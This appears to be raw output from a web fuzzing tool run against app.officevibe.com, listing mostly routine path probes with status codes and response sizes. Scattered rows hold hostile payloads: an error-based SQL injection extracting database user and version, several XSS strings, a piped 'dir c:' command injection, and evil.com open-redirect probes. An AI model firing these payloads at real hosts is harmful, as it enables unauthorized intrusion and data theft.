FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
portal.php?mod=view,https://app.officevibe.com/portal.php?mod=view,,162831,200,2808,111,9,text/html,56.907449ms,
portal/UPGRADE.txt,https://app.officevibe.com/portal/UPGRADE.txt,,163167,200,2808,111,9,text/html,68.447506ms,
portal/broker/dentalplans.sdo,https://app.officevibe.com/portal/broker/dentalplans.sdo,,163914,200,2808,111,9,text/html,75.801936ms,
portal.pl,https://app.officevibe.com/portal.pl,,164126,200,2808,111,9,text/html,78.79175ms,
portal/yonetici/toplist.asp,https://app.officevibe.com/portal/yonetici/toplist.asp,,165197,200,2808,111,9,text/html,107.884718ms,
portal-home.jsp,https://app.officevibe.com/portal-home.jsp,,166037,200,2808,111,9,text/html,65.691693ms,
_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,https://app.officevibe.com/_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,,166344,500,75,12,1,text/html,101.585863ms,
portal/shopping/disclaimer.do,https://app.officevibe.com/portal/shopping/disclaimer.do,,167066,200,2808,111,9,text/html,55.101926ms,
portal.php,https://app.officevibe.com/portal.php,,167905,200,2808,111,9,text/html,51.09218ms,
#/../manager/text,https://app.officevibe.com/#/../manager/text,,168130,200,4421,480,84,text/html; charset=utf-8,38.103224ms,
portal/shopping/dentalselect.sdo,https://app.officevibe.com/portal/shopping/dentalselect.sdo,,168616,200,2808,111,9,text/html,68.856179ms,
portal/employer/custom/content.do,https://app.officevibe.com/portal/employer/custom/content.do,,170132,200,2808,111,9,text/html,68.312255ms,
portal.po,https://app.officevibe.com/portal.po,,174316,200,2808,111,9,text/html,60.410396ms,
portal/changelog.txt,https://app.officevibe.com/portal/changelog.txt,,174375,200,2808,111,9,text/html,61.122024ms,
portal/provider/alternativecareselection.sdo,https://app.officevibe.com/portal/provider/alternativecareselection.sdo,,174596,200,2808,111,9,text/html,51.344971ms,
portal_index.html,https://app.officevibe.com/portal_index.html,,176804,200,2808,111,9,text/html,51.049603ms,
PortalPagePrivateCustomers.aspx,https://app.officevibe.com/PortalPagePrivateCustomers.aspx,,176965,200,2808,111,9,text/html,52.400131ms,
?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://app.officevibe.com/?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,,177755,200,4421,480,84,text/html; charset=utf-8,49.127999ms,
portal-start.do,https://app.officevibe.com/portal-start.do,,178712,200,2808,111,9,text/html,48.692029ms,
portal/shopping/search.sdo,https://app.officevibe.com/portal/shopping/search.sdo,,179377,200,2808,111,9,text/html,55.932742ms,
portal_pop.html,https://app.officevibe.com/portal_pop.html,,181225,200,2808,111,9,text/html,69.601155ms,
portal/member/dentalplans.do,https://app.officevibe.com/portal/member/dentalplans.do,,183165,200,2808,111,9,text/html,54.28972ms,
portal/member/content/iwc/mysites/pge/home.action,https://app.officevibe.com/portal/member/content/iwc/mysites/pge/home.action,,183747,200,2808,111,9,text/html,66.229194ms,
portal/member/search.do,https://app.officevibe.com/portal/member/search.do,,184126,200,2808,111,9,text/html,57.353963ms,
portal/member/content/iwc/mysites/uc/welvie.action,https://app.officevibe.com/portal/member/content/iwc/mysites/uc/welvie.action,,188307,200,2808,111,9,text/html,68.286249ms,
portalnoticeboard.do,https://app.officevibe.com/portalnoticeboard.do,,189286,200,2808,111,9,text/html,62.3512ms,
?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://app.officevibe.com/?targetURL=https://www.owler.com/iaApp/getDataCard.htm,,190572,200,4421,480,84,text/html; charset=utf-8,47.405435ms,
portal/System.html,https://app.officevibe.com/portal/System.html,,191230,200,2808,111,9,text/html,50.65095ms,
portal.rightMenu.html,https://app.officevibe.com/portal.rightMenu.html,,192054,200,2808,111,9,text/html,48.762633ms,
portalview.aspx,https://app.officevibe.com/portalview.aspx,,192806,200,2808,111,9,text/html,55.703458ms,
portal/wp-includes/wlwmanifest.xml,https://app.officevibe.com/portal/wp-includes/wlwmanifest.xml,,193434,200,2808,111,9,text/html,62.385669ms,
portal/install.pgsql.txt,https://app.officevibe.com/portal/install.pgsql.txt,,195207,200,2808,111,9,text/html,57.635777ms,
portals.php,https://app.officevibe.com/portals.php,,195539,200,2808,111,9,text/html,49.331725ms,
portal/xportal.mdb,https://app.officevibe.com/portal/xportal.mdb,,196728,200,2808,111,9,text/html,49.30571ms,
servlet/custMsg?guestName=<script>alert(document.cookie)(\,https://app.officevibe.com/servlet/custMsg?guestName=<script>alert(document.cookie)(\,,197213,500,75,12,1,text/html,58.533605ms,
portal/disclaimer.sdo,https://app.officevibe.com/portal/disclaimer.sdo,,197426,200,2808,111,9,text/html,52.65595ms,
portal5ES.asp,https://app.officevibe.com/portal5ES.asp,,197446,200,2808,111,9,text/html,50.599197ms,
#/../html,https://app.officevibe.com/#/../html,,198439,200,4421,480,84,text/html; charset=utf-8,53.146515ms,
PortalNewsClip.aspx,https://app.officevibe.com/PortalNewsClip.aspx,,198868,200,2808,111,9,text/html,69.838313ms,
portal_tabcontent.aspx,https://app.officevibe.com/portal_tabcontent.aspx,,199409,200,2808,111,9,text/html,64.946394ms,
portal/provider/content.do,https://app.officevibe.com/portal/provider/content.do,,199486,200,2808,111,9,text/html,64.124617ms,
portal.header.html,https://app.officevibe.com/portal.header.html,,201239,200,2808,111,9,text/html,84.949171ms,
#/../www,https://app.officevibe.com/#/../www,,203527,200,4421,480,84,text/html; charset=utf-8,48.471339ms,
portal/Login.jsp,https://app.officevibe.com/portal/Login.jsp,,203794,200,2808,111,9,text/html,50.106792ms,
*/?lang.ru,https://app.officevibe.com/*/?lang.ru,https://app.officevibe.com/*?lang.ru,203811,301,1383,270,21,text/html; charset=UTF-8,59.973486ms,
#/../manager/html,https://app.officevibe.com/#/../manager/html,,205028,200,4421,480,84,text/html; charset=utf-8,39.361069ms,
cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>,https://app.officevibe.com/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>,,205737,500,75,12,1,text/html,66.499081ms,
portalSearch.do,https://app.officevibe.com/portalSearch.do,,208109,200,2808,111,9,text/html,60.339866ms,
portal/member/alternativecareselection.sdo,https://app.officevibe.com/portal/member/alternativecareselection.sdo,,208581,200,2808,111,9,text/html,60.339922ms,
portal/provider/disclaimer.sdo,https://app.officevibe.com/portal/provider/disclaimer.sdo,,208709,200,2808,111,9,text/html,63.135554ms,
cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>,https://app.officevibe.com/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>,,210614,500,75,12,1,text/html,87.032197ms,
portalinfomanager.do,https://app.officevibe.com/portalinfomanager.do,,211646,200,2808,111,9,text/html,53.201606ms,
portal/employer/alternativecareselection.sdo,https://app.officevibe.com/portal/employer/alternativecareselection.sdo,,212772,200,2808,111,9,text/html,54.622204ms,
portal/yonetici/dosya.asp,https://app.officevibe.com/portal/yonetici/dosya.asp,,215249,200,2808,111,9,text/html,50.577389ms,
portal_chatter.xml,https://app.officevibe.com/portal_chatter.xml,,215390,200,2808,111,9,text/html,55.654371ms,
portal/pdaview.asp,https://app.officevibe.com/portal/pdaview.asp,,218094,200,2808,111,9,text/html,59.983384ms,
portalnoticias.jsp,https://app.officevibe.com/portalnoticias.jsp,,218266,200,2808,111,9,text/html,51.130146ms,
portal/cron.php,https://app.officevibe.com/portal/cron.php,,219488,200,2808,111,9,text/html,63.506229ms,
PortalTemplate.aspx,https://app.officevibe.com/PortalTemplate.aspx,,219653,200,2808,111,9,text/html,92.852171ms,
portalhome.do,https://app.officevibe.com/portalhome.do,,219998,200,2808,111,9,text/html,68.382674ms,
portal/member/content/iwc/mysites/myaon/welvie.action,https://app.officevibe.com/portal/member/content/iwc/mysites/myaon/welvie.action,,220863,200,2808,111,9,text/html,52.473759ms,
portal/kb.php,https://app.officevibe.com/portal/kb.php,,221290,200,2808,111,9,text/html,52.04029ms,
PortalResults.mspx,https://app.officevibe.com/PortalResults.mspx,,221391,200,2808,111,9,text/html,49.929876ms,
portal/employer/alternativecareselection.do,https://app.officevibe.com/portal/employer/alternativecareselection.do,,221659,200,2808,111,9,text/html,58.183915ms,
portal-access-tracking.portalaccesstracking.do,https://app.officevibe.com/portal-access-tracking.portalaccesstracking.do,,222318,200,2808,111,9,text/html,60.123779ms,
portal/broker/search.sdo,https://app.officevibe.com/portal/broker/search.sdo,,224105,200,2808,111,9,text/html,58.058609ms,
portalelogin.do,https://app.officevibe.com/portalelogin.do,,224566,200,2808,111,9,text/html,62.317402ms,
portaldictionary.xml,https://app.officevibe.com/portaldictionary.xml,,225846,200,2808,111,9,text/html,61.301192ms,
portal/shopping/dentalSelect.do,https://app.officevibe.com/portal/shopping/dentalSelect.do,,226561,200,2808,111,9,text/html,58.374997ms,
portal/member/alternativecareselection.do,https://app.officevibe.com/portal/member/alternativecareselection.do,,229712,200,2808,111,9,text/html,56.913518ms,
portal/site/PortalConteudo/template.PAGE/menuitem,https://app.officevibe.com/portal/site/PortalConteudo/template.PAGE/menuitem,,229927,200,2808,111,9,text/html,56.571561ms,
portal.do,https://app.officevibe.com/portal.do,,230147,200,2808,111,9,text/html,56.58485ms,
portalseite.php,https://app.officevibe.com/portalseite.php,,230624,200,2808,111,9,text/html,53.967119ms,
portal/member/content.do,https://app.officevibe.com/portal/member/content.do,,230850,200,2808,111,9,text/html,67.843598ms,
portal/provider/dentalselect.sdo,https://app.officevibe.com/portal/provider/dentalselect.sdo,,230906,200,2808,111,9,text/html,48.76428ms,
portalrequestparameterscontrollerhtml.jsp,https://app.officevibe.com/portalrequestparameterscontrollerhtml.jsp,,232427,200,2808,111,9,text/html,60.268222ms,
portal.js.php,https://app.officevibe.com/portal.js.php,,233883,200,2808,111,9,text/html,74.226136ms,
PortalTemplateWue.aspx,https://app.officevibe.com/PortalTemplateWue.aspx,,234395,200,2808,111,9,text/html,72.196015ms,
portalstart_iframe.html,https://app.officevibe.com/portalstart_iframe.html,,234715,200,2808,111,9,text/html,64.597016ms,
portal/employer/custom/content.sdo,https://app.officevibe.com/portal/employer/custom/content.sdo,,234978,200,2808,111,9,text/html,81.582887ms,
portal/member/dentalselect.sdo,https://app.officevibe.com/portal/member/dentalselect.sdo,,236386,200,2808,111,9,text/html,58.430097ms,
portal_footer.html,https://app.officevibe.com/portal_footer.html,,236522,200,2808,111,9,text/html,61.015578ms,
portal/INSTALL.txt,https://app.officevibe.com/portal/INSTALL.txt,,237411,200,2808,111,9,text/html,72.041171ms,
portalJsonpController.do,https://app.officevibe.com/portalJsonpController.do,,237678,200,2808,111,9,text/html,91.867987ms,
portalLogin.jsp,https://app.officevibe.com/portalLogin.jsp,,239361,200,2808,111,9,text/html,54.185248ms,
portal/client/eshop/productSendEmail!execute.action,https://app.officevibe.com/portal/client/eshop/productSendEmail!execute.action,,239667,200,2808,111,9,text/html,59.809008ms,
portal/index.php,https://app.officevibe.com/portal/index.php,,240220,200,2808,111,9,text/html,58.592878ms,
portal/member/search.ndo,https://app.officevibe.com/portal/member/search.ndo,,240262,200,2808,111,9,text/html,55.873012ms,
portal/member/search.sdo,https://app.officevibe.com/portal/member/search.sdo,,241597,200,2808,111,9,text/html,60.057241ms,
email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E,https://app.officevibe.com/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E,,241606,500,75,12,1,text/html,61.042942ms,
robots.txt,https://app.officevibe.com/robots.txt,,242470,200,104,7,7,text/plain,41.302306ms,
portal/addtoapplication.php,https://app.officevibe.com/portal/addtoapplication.php,,244395,200,2808,111,9,text/html,55.939822ms,
portal/member/content/iwc/mysites/lausd/welvie.action,https://app.officevibe.com/portal/member/content/iwc/mysites/lausd/welvie.action,,244446,200,2808,111,9,text/html,52.025538ms,
portalMain.do,https://app.officevibe.com/portalMain.do,,244567,200,2808,111,9,text/html,52.011056ms,
portal/client/eshop/minibasketwaring.action,https://app.officevibe.com/portal/client/eshop/minibasketwaring.action,,244750,200,2808,111,9,text/html,64.69376ms,
portal/broker/content.sdo,https://app.officevibe.com/portal/broker/content.sdo,,244985,200,2808,111,9,text/html,56.427269ms,
~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,https://app.officevibe.com/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,,247309,500,1789,370,41,text/html; charset=utf-8,66.121653ms,
post32.exe|dir%20c:\\,https://app.officevibe.com/post32.exe|dir%20c:\\,https://app.officevibe.com/post32.exe|dir c:,249375,301,1391,271,21,text/html; charset=UTF-8,70.484228ms,
portaluseractions.jsp,https://app.officevibe.com/portaluseractions.jsp,,251036,200,2808,111,9,text/html,60.873141ms,
portal/yonetici/uyeler.asp,https://app.officevibe.com/portal/yonetici/uyeler.asp,,251293,200,2808,111,9,text/html,85.446231ms,
portal.asp,https://app.officevibe.com/portal.asp,,252328,200,2808,111,9,text/html,49.27382ms,
portal/search.php,https://app.officevibe.com/portal/search.php,,252870,200,2808,111,9,text/html,52.400853ms,
portalnews.txt,https://app.officevibe.com/portalnews.txt,,253824,200,2808,111,9,text/html,62.811759ms,
portal/client/idm/handleVOPUnavailabilityMessages!warningUnavailabilityMessages.action,https://app.officevibe.com/portal/client/idm/handleVOPUnavailabilityMessages!warningUnavailabilityMessages.action,,254021,200,2808,111,9,text/html,57.824683ms,
portal/broker/custom/content.do,https://app.officevibe.com/portal/broker/custom/content.do,,254316,200,2808,111,9,text/html,56.667221ms,
portal/modules.php,https://app.officevibe.com/portal/modules.php,,255822,200,2808,111,9,text/html,66.733636ms,
portaldeconcursos.do,https://app.officevibe.com/portaldeconcursos.do,,256604,200,2808,111,9,text/html,64.595365ms,
portal/broker/content.do,https://app.officevibe.com/portal/broker/content.do,,257848,200,2808,111,9,text/html,59.669341ms,
portal/broker/dentalSelect.sdo,https://app.officevibe.com/portal/broker/dentalSelect.sdo,,257925,200,2808,111,9,text/html,68.923703ms,
portal_right.php,https://app.officevibe.com/portal_right.php,,258650,200,2808,111,9,text/html,73.532772ms,
portal/INSTALL.mysql.txt,https://app.officevibe.com/portal/INSTALL.mysql.txt,,259017,200,2808,111,9,text/html,64.044617ms,
PortalNotice.aspx,https://app.officevibe.com/PortalNotice.aspx,,260131,200,2808,111,9,text/html,62.991925ms,
portal.loader.html,https://app.officevibe.com/portal.loader.html,,262072,200,2808,111,9,text/html,79.173242ms,
https://url.com/redirect/?url=http://twitter.com,https://app.officevibe.com/https://url.com/redirect/?url=http://twitter.com,https://app.officevibe.com/https:/url.com/redirect?url=http://twitter.com,265420,301,1420,270,21,text/html; charset=UTF-8,58.929525ms,
portalifrm.do,https://app.officevibe.com/portalifrm.do,,265966,200,2808,111,9,text/html,55.894529ms,
portal.htm,https://app.officevibe.com/portal.htm,,266739,200,2808,111,9,text/html,62.967696ms,
portalconfig.xml,https://app.officevibe.com/portalconfig.xml,,269474,200,2808,111,9,text/html,65.944669ms,
portal/client/cms/viewSitemap.action,https://app.officevibe.com/portal/client/cms/viewSitemap.action,,269530,200,2808,111,9,text/html,53.836713ms,
portalConsultationList_2011.do,https://app.officevibe.com/portalConsultationList_2011.do,,270211,200,2808,111,9,text/html,69.985671ms,
portal/broker/alternativecareselection.sdo,https://app.officevibe.com/portal/broker/alternativecareselection.sdo,,270615,200,2808,111,9,text/html,65.203576ms,
portal.portal.action,https://app.officevibe.com/portal.portal.action,,271929,200,2808,111,9,text/html,57.233896ms,
/evil.com/%2F..,https://app.officevibe.com//evil.com/%2F..,,272876,200,4421,480,84,text/html; charset=utf-8,48.094379ms,
portal/member/content/iwc/mysites/calpers/welvie.action,https://app.officevibe.com/portal/member/content/iwc/mysites/calpers/welvie.action,,273588,200,2808,111,9,text/html,70.807262ms,
portal/member/dentalplans.sdo,https://app.officevibe.com/portal/member/dentalplans.sdo,,274601,200,2808,111,9,text/html,52.395032ms,
portal/broker/search.ndo,https://app.officevibe.com/portal/broker/search.ndo,,274690,200,2808,111,9,text/html,60.965059ms,
portal/de/system/fehlermeldung.html,https://app.officevibe.com/portal/de/system/fehlermeldung.html,,275239,200,2808,111,9,text/html,47.910159ms,
portal/shopping/search.do,https://app.officevibe.com/portal/shopping/search.do,,275672,200,2808,111,9,text/html,57.283363ms,
portal.aspx,https://app.officevibe.com/portal.aspx,,278098,200,2808,111,9,text/html,51.996893ms,
portal/Loading.jsp,https://app.officevibe.com/portal/Loading.jsp,,278621,200,2808,111,9,text/html,54.580278ms,
portal.tpl,https://app.officevibe.com/portal.tpl,,278828,200,2808,111,9,text/html,48.177694ms,
portal/broker/dentalSelect.do,https://app.officevibe.com/portal/broker/dentalSelect.do,,278838,200,2808,111,9,text/html,50.088357ms,
portal/provider/custom/content.sdo,https://app.officevibe.com/portal/provider/custom/content.sdo,,279678,200,2808,111,9,text/html,56.961482ms,
portalappadmin/login.jsp,https://app.officevibe.com/portalappadmin/login.jsp,,280451,200,2808,111,9,text/html,56.983291ms,
portal/site/ims/menuitem.edb2b81823f67dab41d84b903208c22a,https://app.officevibe.com/portal/site/ims/menuitem.edb2b81823f67dab41d84b903208c22a,,280953,200,2808,111,9,text/html,52.157627ms,
portal_dojo/v1.4.3/dojo/resources,https://app.officevibe.com/portal_dojo/v1.4.3/dojo/resources,,281732,200,2808,111,9,text/html,67.012549ms,
portalgroups/portalgroups/getfile.cgi,https://app.officevibe.com/portalgroups/portalgroups/getfile.cgi,,282839,200,2808,111,9,text/html,68.624324ms,
portal/provider/viewContactUsForm.sdo,https://app.officevibe.com/portal/provider/viewContactUsForm.sdo,,283662,200,2808,111,9,text/html,72.649162ms,
portal/provider/alternativeCareSelection.do,https://app.officevibe.com/portal/provider/alternativeCareSelection.do,,284975,200,2808,111,9,text/html,50.244373ms,
portal-bar.html,https://app.officevibe.com/portal-bar.html,,285139,200,2808,111,9,text/html,60.858384ms,
